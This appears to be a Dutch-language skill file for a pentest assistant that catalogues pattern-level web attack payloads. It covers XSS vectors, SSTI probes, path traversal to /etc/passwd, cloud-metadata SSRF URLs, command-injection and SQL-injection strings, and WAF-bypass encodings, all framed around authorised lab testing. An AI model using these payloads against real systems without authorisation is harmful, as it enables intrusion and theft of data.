---
name: payload-crafter
description: Pattern-level payload library voor XSS, SSTI, LFI, SSRF en command-injection — context-detectie (HTML-body/attribute/JS/CSS/URL), encoding-bypass-shapes (URL/HTML/Unicode/double), polyglots, WAF-bypass-patronen op syntax-niveau. Geen versie-specifieke weaponized exploits.
---

# Payload Crafter

> **Pattern-level discipline**: deze skill levert payload-shapes ter illustratie van klasse-gedrag, niet kant-en-klare exploits tegen specifieke target-versies. Werkende exploits voor productie-targets vereisen RoE-akkoord en lab-context. Versie-specifieke 0-day-payloads (gadget-chains, PoC's voor specifieke benoemde CVE's) staan hier niet — die horen in een afgesloten engagement-werkruimte, niet in een herbruikbare skill.

## Wanneer gebruiken

Payloads zijn de hands-on side van vuln-discovery. `web-exploit-triage` classificeert; deze skill levert de illustratieve test-shapes per klasse, voor verificatie in lab of binnen ROE-toegestane sandbox.

Activeert bij:

- Een vraag als "wat is een geschikte XSS-payload voor JS-context", "test-payload voor SSTI op Jinja2", "LFI-voorbeeld met PHP wrappers", "SSRF naar cloud-metadata pattern", "WAF-bypass voor SQLi".
- Lab-werk waar je een specifieke vuln-klasse aan het verifiëren bent en een patroon-illustratie nodig hebt.
- Training-context: voorbeelden tonen aan ontwikkelaars zodat ze zien wat hun input-validatie moet vangen.
- Defensieve-context: WAF-tuning, regex-rules opbouwen — testers leveren shapes, defenders bouwen detection.

### Wanneer NIET (handoff)

- Klassificatie wel/niet exploitable → `web-exploit-triage` (deze skill leunt erop).
- Versie-specifieke RCE PoC's → niet in deze skill. Engagement-specifieke werk.
- Chain-assembly → `exploit-chain`.
- Post-exploitation-payloads (reverse shells, persistence-implants) → `post-exploit`. Deze skill stopt bij eerste-impact-shape.
- AD-specifieke payloads (Kerberos-tickets) → `ad-attacks`.
- C2-payload-staging → `c2-hygiene`.
- WAF-fingerprinting van een specifieke productie-WAF om die gericht te bypassen → engagement-werk binnen RoE; deze skill levert generieke encoding-shapes.

## Aanpak

Zes fases. Fase 2 (klasse-keuze + context) en fase 3 (pattern-library) zijn de kern.

### 1. Context-detectie

Een payload zonder context-passing werkt niet. Voor je een payload kiest, weet:

- **Reflectie-locatie**: HTML-body, HTML-attribute, JavaScript-string, JavaScript-context, CSS, URL-parameter, header-value, JSON-veld, HTTP-response.
- **Encoding van het kanaal**: wordt input HTML-escaped, JS-string-escaped, URL-encoded? Welke karakters overleven onaangetast?
- **Output-context**: render-context (browser HTML, browser JS, server-side template, command, SQL, LDAP, XPath).
- **Sanitization in pad**: framework-default-escape, expliciete `bleach` of `DOMPurify`, allow-list-validatie.
- **Length-limits en character-filters**: sommige payloads zijn alleen praktisch onder bepaalde lengtes.

Zonder deze vijf is payload-keuze gokken. Begin met benigne probes (zoals `xss<>"&'1234567`) en kijk wat in de response overleeft.

### 2. Klasse-selectie

Match symptoom met klasse:

- **XSS** als input in HTML/JS-render-context belandt en niet-context-aware-escaped is.
- **SSTI** als input in een server-side template-string belandt (vaak herkenbaar aan reflectie van `{{...}}` of `${...}`-evaluatie).
- **LFI / Path Traversal** als input in een file-system-call (read, include, require) belandt.
- **SSRF** als input in een outbound HTTP-call belandt en de host bepaalt.
- **Command Injection** als input in een shell-execution belandt (subprocess, system, exec, backtick).
- **Headers / Smuggling**: HTTP request-smuggling, host-header-injection, etc. Specialty-classes.

Cross-reference klasse-detectie met `web-exploit-triage`. Geen payload sturen zonder classificatie.

### 3. Pattern-library per klasse

Pattern-niveau alleen. Wat hieronder volgt zijn klasse-illustraties die in elk OWASP-cheat-sheet of PortSwigger-lab vrij beschikbaar zijn — geen 0-days, geen specifieke CVE-PoC's.

**XSS — context-specifieke vorm-keuze**:

```
HTML body context:           <svg onload=alert(1)>
HTML attribute (unquoted):   x onmouseover=alert(1)
HTML attribute (quoted):     ">x onmouseover=alert(1)
JavaScript string:           ';alert(1);//
JavaScript context (no quotes): -alert(1)-
URL/href context:            javascript:alert(1)
Image src:                   <img src=x onerror=alert(1)>
SVG:                         <svg/onload=alert(1)>
```

Polyglot (één payload, meerdere contexts) bestaan in OWASP-collecties — gebruik wanneer je context onbekend is in eerste probe.

**SSTI — engine-fingerprint en class-test**:

```
Engine-fingerprint probes (welke evaluatie?):
  {{7*7}}      → Jinja2/Twig/Liquid → 49
  ${7*7}       → JSP/Spring SpEL/FreeMarker → 49
  <%= 7*7 %>   → ERB/EJS → 49
  *{7*7}       → Thymeleaf → 49
  #{7*7}       → some Spring/Ruby → 49

Klassetest (NIET payload-completion):
  Jinja2: {{ ''.__class__.__mro__[1].__subclasses__() }}
  → toont class-tree, voldoende bewijs voor SSTI-classificatie
```

Pas op: werkende RCE-payloads voor Jinja/FreeMarker/etc. zijn engine-versie-specifiek en horen in een lab-context, niet in deze skill.

**LFI / Path Traversal — traversal-shapes en wrappers**:

```
Basic traversal:             ../../../etc/passwd
URL-encoded:                 %2e%2e%2f%2e%2e%2fetc%2fpasswd
Double-encoded:              %252e%252e%252fetc%252fpasswd
Null-byte (legacy):          ../../../etc/passwd%00
PHP wrappers:                php://filter/convert.base64-encode/resource=index.php
Windows traversal:           ..\..\..\windows\win.ini
Unicode bypass:              ..%c0%afetc/passwd
```

Wrappers en encoding-vorm hangen af van platform en filter-stack; probe in lab.

**SSRF — protocol- en target-shapes**:

```
Cloud-metadata-targets (op patroon-niveau):
  AWS:    http://169.254.169.254/latest/meta-data/
  GCP:    http://metadata.google.internal/
  Azure:  http://169.254.169.254/metadata/instance?api-version=2021-02-01

Protocol-smuggling:
  file:///etc/passwd
  gopher://target:port/_<protocol-payload>
  dict://target:11211/stat
  ldap://target/

DNS-rebinding-pattern: hostname die initieel naar publiek IP resolved, na TTL naar interne IP.
```

Verifieer alleen dat de outbound-call gemaakt wordt (DNS-callback met `interactsh`, Burp Collaborator), zonder daadwerkelijk gevoelige interne endpoints te raken op productie.

**Command Injection — separator- en bypass-shapes**:

```
Common separators:  ; & | && ||
Substitution:       $(cmd) `cmd` ${cmd}
Newline:            \n cmd
Whitespace bypass:  ${IFS}cat /etc/passwd
Brace expansion:    {cat,/etc/passwd}
Encoded:            base64-decoded one-liners (in lab only)
```

Voor production-PoC: harmless probe (`id`, `hostname`, `whoami`), niet `cat /etc/shadow` of data-extraction.

**SQL Injection — class-fingerprint** (al uitgebreid via SAST/DAST tooling, hier kort):

```
Tautology:          ' OR '1'='1
Comment-based:      ' OR 1=1--
Union-based test:   ' UNION SELECT NULL-- 
Boolean-blind:      ' AND SUBSTR((SELECT version()),1,1)='5'-- 
Time-blind:         ' AND SLEEP(5)-- 
```

Tools (sqlmap) automatiseren productie-discovery; deze skill levert het patroon-niveau dat reviewer-mensen begrijpen.

### 4. WAF-bypass: encoding-shapes op patroon-niveau

WAF's matchen op signatures. Bypass-shapes muteren de payload zodat de signature niet matcht maar de target-parser nog steeds correct evalueert.

- **Case-variation**: `<ScRiPt>`, `SeLeCt`. Goedkope eerste poging.
- **URL-encoding**: standaard, double (`%252f`), triple. Meeste WAF's decoderen 1× of 2×, niet altijd 3×.
- **HTML-entity-encoding**: `&#x3c;script&#x3e;`. Werkt op HTML-render-context.
- **Unicode-equivalents**: full-width Latin (`<`= U+FF1C `＜`), homoglyphs.
- **Comment-insertion** in SQL: `SE/**/LECT`, `UN/**/ION`.
- **Parameter-pollution**: `param=val1&param=val2` — sommige WAF's zien alleen één instance, target-parser combineert.
- **Whitespace-substitution**: tab `\t`, newline `\n`, carriage-return, formfeed, `IFS` in shell.
- **Concatenation-tricks**: SQL `'a'||'b'`, JS `String.fromCharCode(...)`.
- **HPP (HTTP Parameter Pollution)** + JSON-body-mismatch: parser-discrepancies tussen WAF en app.

Discipline: werk-met-één-bypass-tegelijk en log wat werkte, voor reproduceerbaarheid en voor blue-team-feedback.

### 5. Lab-verificatie en PoC-discipline

- **Eerst lab, dan productie**. Build de lokale variant (Docker-container met dezelfde framework-versie) en test je payload tot hij werkt voor je hem ergens anders gebruikt.
- **Probe-payload eerst**: harmless bewijs dat de class-injection werkt (`alert(1)`, `id`, `7*7=49`). Niet meteen full-impact.
- **Geen data-exfil tegen productie zonder akkoord**. Een `cat /etc/passwd` is op de meeste systemen low-impact maar je-hoort-het-niet-zonder-akkoord. Een `select ssn from users` zeker niet.
- **Cleanup-pad**: als je payload state achterlaat (stored XSS, database-rij), benoem hoe het opgeruimd wordt.
- **Detection-feedback** waar mogelijk: vertel de blue-team welke payload-shape je gebruikte, zodat hun WAF/SIEM/IDS-rules op nut getest worden.

### 6. Verification-loop

Laag 1: scope (payload binnen RoE-toegestane scope, geen experimenten op out-of-scope of derde-partij?), aannames (payload op patroon-niveau gebleven, niet ongemerkt versie-specifiek geworden?), gaps (context-detectie geverifieerd, niet gegokt?). Laag 2: payload-shapes uit publieke OWASP/PortSwigger-bronnen geattribueerd, geen versie-specifieke gadget-chains in de skill, geen kant-en-klare exploit voor benoemde CVE's, encoding-claims (welke WAF welke encoding decodeert) niet als feit gepresenteerd zonder verificatie.

## Output

Per probe of test:

```
Payload-test — <klasse> in <context>
RoE-scope:        <bevestigd>
Context-detect:   <HTML-body | JS-string | URL | ...>
Filter-pad:       <bekend | onbekend>

Probes uitgevoerd:
  1. <shape> → <response/observation, redacted>
  2. ...

Bevestigde klasse:    <ja, met patroon-bewijs | nee>
Geprobeerde bypass:   <encoding-vormen, WAF-respons>
Class-niveau bevestigd zonder weaponization: <ja>

Handoff:
  - web-exploit-triage:  <classificatie + impact>
  - exploit-chain:       <kandidaat voor chain Y/N>
  - pentest-reporter:    <finding-shape voor rapport>

Verification-loop: ...
```

Niet meegeven aan opdrachtgever: ruwe weaponized-PoC's, productie-test-creds, onveiligde shell-spawn-payloads. Patroon-shape met "verifieerbaar in lab"-doc is voldoende.

## Referenties

- **OWASP XSS Filter Evasion Cheat Sheet** — [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Canonical XSS-patroon-bron.
- **PortSwigger Web Security Academy** — [https://portswigger.net/web-security](https://portswigger.net/web-security). Per-vuln-klasse labs, beste open lab-collectie.
- **PayloadsAllTheThings** — [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Community-collection van klasse-payloads. Tweede lezen, eerste verifiëren.
- **OWASP SSTI Wiki** — [https://owasp.org/www-project-web-security-testing-guide/](https://owasp.org/www-project-web-security-testing-guide/) (WSTG-INPV-18). Engine-fingerprint-patronen.
- **OWASP Command Injection Defense Cheat Sheet** — [https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html).
- **OWASP Path Traversal** — [https://owasp.org/www-community/attacks/Path_Traversal](https://owasp.org/www-community/attacks/Path_Traversal).
- **HackTricks** — [https://book.hacktricks.xyz/](https://book.hacktricks.xyz/). Community-doc per attack-class. Verifieer-bij-gebruik, niet alle entries even goed gecontroleerd.
- **CWE** — [https://cwe.mitre.org/](https://cwe.mitre.org/). Class-IDs voor finding-classificatie.

## Categorieën

- pentest
